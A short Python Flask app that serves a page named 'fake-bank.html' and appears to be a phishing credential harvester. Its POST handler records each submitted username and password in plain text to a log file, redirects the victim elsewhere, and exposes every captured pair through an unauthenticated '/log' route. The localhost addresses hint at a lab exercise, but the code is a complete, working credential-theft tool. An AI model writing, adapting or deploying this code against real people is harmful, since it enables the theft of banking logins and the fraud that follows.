from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)
URL = "http://localhost:80"

script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

post_log = "log-Q4.txt"
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        print("post method called")
        username = request.form.get("username")
        password = request.form.get("password")

        with open(post_log, "r+") as file:
            if f"{username},{password}" not in file.read():
                file.write(f"{username},{password}\n")
        
        return redirect(f'http://localhost:80', 308)
        
    
    return render_template('fake-bank.html')

@app.route("/log")
def log():
    with open(post_log, "r") as file:
        post_log_content = file.read()
    return f"<p>{post_log_content}</p>"
    

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=4050)
